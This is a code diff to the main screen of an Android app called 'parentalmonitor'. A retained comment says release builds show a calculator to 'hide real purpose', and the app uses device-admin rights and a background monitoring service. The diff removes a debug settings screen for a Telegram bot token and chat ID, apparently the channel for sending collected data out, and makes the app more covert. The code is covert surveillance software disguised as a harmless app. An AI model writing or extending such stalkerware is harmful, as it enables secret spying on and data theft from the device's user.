@@ -11,35 +11,16 @@ import android.widget.Toast
 import androidx.activity.result.contract.ActivityResultContracts
 import androidx.appcompat.app.AppCompatActivity
 import androidx.core.content.ContextCompat
-import com.google.android.material.button.MaterialButton
-import com.google.android.material.textfield.TextInputEditText
 import com.redeye.parentalmonitor.R
-import com.redeye.parentalmonitor.data.MessageQueue
 import com.redeye.parentalmonitor.data.PreferencesManager
 import com.redeye.parentalmonitor.receiver.AdminReceiver
-import com.redeye.parentalmonitor.utils.MessageScheduler
 import com.redeye.parentalmonitor.service.MonitoringService
-import android.widget.TextView
 import android.content.Context
-import java.text.SimpleDateFormat
-import java.util.*
 import com.redeye.parentalmonitor.BuildConfig
-import android.view.View
-import android.widget.LinearLayout
 
 class MainActivity : AppCompatActivity() {
 
     private lateinit var preferencesManager: PreferencesManager
-    private lateinit var messageQueue: MessageQueue
-    
-    private lateinit var botTokenInput: TextInputEditText
-    private lateinit var chatIdInput: TextInputEditText
-    private lateinit var syncIntervalInput: TextInputEditText
-    private lateinit var saveSettingsButton: MaterialButton
-    private lateinit var requestPermissionsButton: MaterialButton
-    private lateinit var toggleMonitoringButton: MaterialButton
-    private lateinit var statusText: TextView
-    private lateinit var lastSyncText: TextView
 
     private val requiredPermissions = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
         arrayOf(
@@ -81,7 +62,6 @@ class MainActivity : AppCompatActivity() {
                 }
             }
             
-            updateUI()
         } else {
             android.util.Log.w("MainActivity", "⚠️ Some permissions denied")
             Toast.makeText(this, getString(R.string.msg_permissions_denied), Toast.LENGTH_SHORT).show()
@@ -95,18 +75,6 @@ class MainActivity : AppCompatActivity() {
         android.util.Log.i("MainActivity", "BuildConfig.DEBUG = ${BuildConfig.DEBUG}")
         
         preferencesManager = PreferencesManager(this)
-        messageQueue = MessageQueue(this)
-        
-        // Apply pre-configured settings
-        try {
-            android.util.Log.d("MainActivity", "Attempting to load AutoConfig...")
-            val autoConfigClass = Class.forName("com.redeye.parentalmonitor.utils.AutoConfig")
-            val applyMethod = autoConfigClass.getDeclaredMethod("applyIfNeeded", Context::class.java)
-            applyMethod.invoke(autoConfigClass.getField("INSTANCE").get(null), this)
-            android.util.Log.i("MainActivity", "✓ AutoConfig applied successfully")
-        } catch (e: Exception) {
-            android.util.Log.e("MainActivity", "✗ AutoConfig not available: ${e.message}")
-        }
         
         // RELEASE mode: Show CALCULATOR (hide real purpose)
         if (!BuildConfig.DEBUG) {
@@ -117,22 +85,6 @@ class MainActivity : AppCompatActivity() {
             return
         }
         
-        // DEBUG mode: Load settings UI
-        android.util.Log.i("MainActivity", "Running in DEBUG mode")
-        setContentView(R.layout.activity_main)
-        
-        initViews()
-        setupListeners()
-        loadSettings()
-        updateUI()
-    }
-    
-    override fun onResume() {
-        super.onResume()
-        // Only update UI in DEBUG mode
-        if (BuildConfig.DEBUG) {
-            updateUI()
-        }
     }
     
     // ═══════════════════════════════════════════════════════════
@@ -351,183 +303,4 @@ class MainActivity : AppCompatActivity() {
             android.util.Log.i("MainActivity", "Device Admin already active")
         }
     }
-
-    private fun initViews() {
-        try {
-            botTokenInput = findViewById(R.id.botTokenInput)
-            chatIdInput = findViewById(R.id.chatIdInput)
-            syncIntervalInput = findViewById(R.id.syncIntervalInput)
-            saveSettingsButton = findViewById(R.id.saveSettingsButton)
-            requestPermissionsButton = findViewById(R.id.requestPermissionsButton)
-            toggleMonitoringButton = findViewById(R.id.toggleMonitoringButton)
-            statusText = findViewById(R.id.statusText)
-            lastSyncText = findViewById(R.id.lastSyncText)
-            android.util.Log.d("MainActivity", "✓ All views initialized")
-        } catch (e: Exception) {
-            android.util.Log.e("MainActivity", "✗ Error initializing views", e)
-        }
-    }
-
-    private fun setupListeners() {
-        saveSettingsButton.setOnClickListener {
-            saveSettings()
-        }
-
-        requestPermissionsButton.setOnClickListener {
-            requestPermissions()
-        }
-
-        toggleMonitoringButton.setOnClickListener {
-            toggleMonitoring()
-        }
-    }
-
-    private fun loadSettings() {
-        botTokenInput.setText(preferencesManager.botToken)
-        chatIdInput.setText(preferencesManager.chatId)
-        syncIntervalInput.setText(preferencesManager.syncInterval.toString())
-    }
-
-    private fun saveSettings() {
-        val botToken = botTokenInput.text.toString().trim()
-        val chatId = chatIdInput.text.toString().trim()
-        val syncInterval = syncIntervalInput.text.toString().toIntOrNull() ?: 60
-
-        if (botToken.isEmpty() || chatId.isEmpty()) {
-            Toast.makeText(this, getString(R.string.msg_fill_all_debug), Toast.LENGTH_SHORT).show()
-            return
-        }
-
-        preferencesManager.botToken = botToken
-        preferencesManager.chatId = chatId
-        preferencesManager.syncInterval = syncInterval
-
-        Toast.makeText(this, getString(R.string.settings_saved), Toast.LENGTH_SHORT).show()
-        updateUI()
-    }
-
-    private fun requestPermissions() {
-        permissionLauncher.launch(requiredPermissions)
-    }
-
-    private fun hasAllPermissions(): Boolean {
-        return requiredPermissions.all { permission ->
-            ContextCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED
-        }
-    }
-
-    private fun toggleMonitoring() {
-        if (!preferencesManager.isConfigured()) {
-            Toast.makeText(this, getString(R.string.msg_save_telegram_first), Toast.LENGTH_SHORT).show()
-            return
-        }
-
-        if (!hasAllPermissions()) {
-            Toast.makeText(this, getString(R.string.msg_grant_first), Toast.LENGTH_SHORT).show()
-            requestPermissions()
-            return
-        }
-
-        val isEnabled = preferencesManager.isMonitoringEnabled
-
-        if (isEnabled) {
-            // Stop monitoring
-            stopMonitoringService()
-            preferencesManager.isMonitoringEnabled = false
-            Toast.makeText(this, getString(R.string.msg_monitoring_stopped), Toast.LENGTH_SHORT).show()
-        } else {
-            // Start monitoring
-            startMonitoringService()
-            preferencesManager.isMonitoringEnabled = true
-            Toast.makeText(this, getString(R.string.monitoring_active), Toast.LENGTH_SHORT).show()
-        }
-
-        updateUI()
-    }
-
-    private fun startMonitoringService() {
-        android.util.Log.d("MainActivity", "Creating service intent...")
-        val intent = Intent(this, MonitoringService::class.java).apply {
-            action = MonitoringService.ACTION_START_MONITORING
-        }
-        
-        android.util.Log.d("MainActivity", "Starting service...")
-        try {
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                startForegroundService(intent)
-                android.util.Log.i("MainActivity", "Started as foreground service")
-            } else {
-                startService(intent)
-                android.util.Log.i("MainActivity", "Started as regular service")
-            }
-        } catch (e: Exception) {
-            android.util.Log.e("MainActivity", "Failed to start service", e)
-            throw e
-        }
-    }
-
-    private fun stopMonitoringService() {
-        val intent = Intent(this, MonitoringService::class.java).apply {
-            action = MonitoringService.ACTION_STOP_MONITORING
-        }
-        startService(intent)
-    }
-
-    private fun updateUI() {
-        // Skip UI updates in RELEASE mode
-        if (!BuildConfig.DEBUG) {
-            return
-        }
-        
-        val isMonitoring = preferencesManager.isMonitoringEnabled
-        val hasPermissions = hasAllPermissions()
-        val isConfigured = preferencesManager.isConfigured()
-
-        // Update status
-        if (isMonitoring) {
-            statusText.text = getString(R.string.monitoring_active)
-            statusText.setTextColor(getColor(R.color.green_success))
-        } else {
-            statusText.text = getString(R.string.monitoring_inactive)
-            statusText.setTextColor(getColor(R.color.red_error))
-        }
-
-        // Update last sync time
-        val lastSync = preferencesManager.lastSyncTime
-        val queueSize = messageQueue.getQueueSize()
-        
-        if (lastSync > 0) {
-            val sdf = SimpleDateFormat("dd.MM.yyyy HH:mm:ss", Locale.getDefault())
-            var text = "${getString(R.string.last_sync)} ${sdf.format(Date(lastSync))}"
-            if (queueSize > 0) {
-                text += "\n" + getString(R.string.queue_pending, queueSize)
-            }
-            lastSyncText.text = text
-        } else {
-            var text = "${getString(R.string.last_sync)} ${getString(R.string.never)}"
-            if (queueSize > 0) {
-                text += "\n" + getString(R.string.queue_pending, queueSize)
-            }
-            lastSyncText.text = text
-        }
-        
-        // Try to send queued messages if any
-        if (queueSize > 0) {
-            MessageScheduler.scheduleMessageSend(this)
-        }
-
-        // Update toggle button
-        if (isMonitoring) {
-            toggleMonitoringButton.text = getString(R.string.disable_monitoring)
-            toggleMonitoringButton.setIconResource(android.R.drawable.ic_media_pause)
-        } else {
-            toggleMonitoringButton.text = getString(R.string.enable_monitoring)
-            toggleMonitoringButton.setIconResource(android.R.drawable.ic_media_play)
-        }
-
-        // Enable/disable buttons based on state
-        toggleMonitoringButton.isEnabled = isConfigured && hasPermissions
-        requestPermissionsButton.isEnabled = !hasPermissions
-    }
 }
-
